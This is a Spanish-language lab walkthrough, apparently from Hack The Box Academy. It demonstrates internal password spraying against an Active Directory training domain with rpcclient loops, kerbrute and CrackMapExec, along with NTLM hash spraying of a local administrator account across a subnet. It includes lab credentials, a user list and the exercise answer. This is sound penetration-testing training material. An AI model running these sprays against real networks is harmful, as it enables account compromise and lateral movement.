Ahora que hemos generado un conjunto de usuarios, es el momento de iniciar el ataque.

## Ataque de fuerza bruta interna de contraseñas desde un host Linux

Una vez creada la lista de palabras mediante uno de los métodos mostrados en la sección anterior, es hora de ejecutar el ataque. 



#### Ataque password spraying con rpcclient
"Rpcclient" es una excelente opción para realizar este ataque desde Linux. 

Es importante tener en cuenta que un inicio de sesión válido no es evidente de inmediato con rpcclient, ya que la respuesta «Authority Name» indica un inicio de sesión exitoso. 
Podemos filtrar los intentos de inicio de sesión no válidos buscando «Authority» en la respuesta. El siguiente comando Bash de una sola línea (adaptado de aquí) se puede usar para realizar el ataque.

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Prueba una sola contraseña "Welcome1" y en caso de que funcione, ejecuta el comando "getusername;" y me devuelve el nombre del usuario y "Authority".
Lo ejecutamos y nos devuelve: dos usuarios que tienen dicha contraseña!.
```shell-session
Polika4RM@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

####  Ataque password spraying con kerbrute
Ejecutando el mismo comando desde Kerbrute, obtenemos: 
```shell-session
Polika4RM@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```
Un usuario encontrado!

####  Ataque password spraying con crackmapExec

Con crackmap podemos ejecutar el escaneo de la siguiente forma: 
```shell-session
Polika4RM@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Después de obtener credenciales útiles, las podemos verificar con: 

```shell-session
Polika4RM@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```


---
### Local Administrator Password Reuse

El **reuso de contraseñas del administrador local** es una práctica común en entornos Windows debido al uso de imágenes doradas (gold images) y configuraciones automatizadas, lo que permite que una misma contraseña se use en múltiples equipos.

Si un atacante obtiene la **contraseña o el hash NTLM** del administrador local en una máquina, puede intentar autenticarse en otros equipos de la red utilizando herramientas como **CrackMapExec**.

Este tipo de ataque se denomina **password spraying interno**, y suele enfocarse en **equipos de alto valor** (por ejemplo, servidores SQL o Exchange), donde es más probable encontrar credenciales privilegiadas almacenadas en memoria.

El atacante también puede aprovechar **patrones de contraseñas reutilizados** o **nombres de cuentas similares** (por ejemplo, de _bsmith_ a _bsmith_adm_ o de _ajones_ a _ajones_adm_), así como **credenciales compartidas entre dominios en entornos con relaciones de confianza**.

Cuando solo se dispone del **hash NTLM** (extraído del SAM local), puede realizarse un **spray del hash** a través de una red (por ejemplo, un /23) para identificar equipos con la misma contraseña de administrador local.  
El uso del parámetro `--local-auth` en CrackMapExec limita los intentos de autenticación a una sola por equipo, evitando bloqueos de cuentas o intentos fallidos en el dominio.

### Local Admin Spraying with CrackMapExec


```shell-session
Polika4RM@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

El resultado anterior muestra que las credenciales eran válidas como administrador local en 3 sistemas de la subred 172.16.5.0/23. Podríamos entonces enumerar cada sistema para ver si encontramos algo que nos ayude a ampliar nuestro acceso.

Esta técnica, si bien es efectiva, genera bastante ruido y no es recomendable para evaluaciones que requieren sigilo. 

----
**TARGET: 10.129.209.78
 SSH to 10.129.209.78 with user "htb-student" and password "HTB_@cademy_stdnt!"
**1. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**
En el ejercicio de la sección anterior, numeré un conjunto de 56 usuarios: 
```
jjones
tjohnson
sbrown
jwilson
bdavis
njohnson
asanchez
dlewis
ccruz
mmorgan
rramirez
jwallace
jsantiago
gdavis
mrichardson
mharrison
tgarcia
jmay
jmontgomery
jhopkins
dpayne
mhicks
adunn
lmatthews
avazquez
mlowe
jmcdaniel
csteele
mmullins
mochoa
aslater
ehoffman
ehamilton
cpennington
srosario
lbradford
halvarez
gmccarthy
dbranch
mshoemaker
mholliday
ngriffith
sinman
minman
rhester
rburrows
dpalacios
strent
fanthony
evalentin
sgage
jshay
jhermann
whouse
emercer
wshepherd
```

```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.209.78
```

Añado todos estos usuarios a un archivo llamado "valid_users.txt"
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Y me devuelve la solución:

```
┌─[htb-student@ea-attack01]─[/etc]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/31/25 - Ronnie Flathers @ropnop

2025/10/31 14:29:14 >  Using KDC(s):
2025/10/31 14:29:14 >  	172.16.5.5:88

2025/10/31 14:29:14 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2025/10/31 14:29:14 >  Done! Tested 34 logins (1 successes) in 0.039 seconds

```
Respuesta: sgage
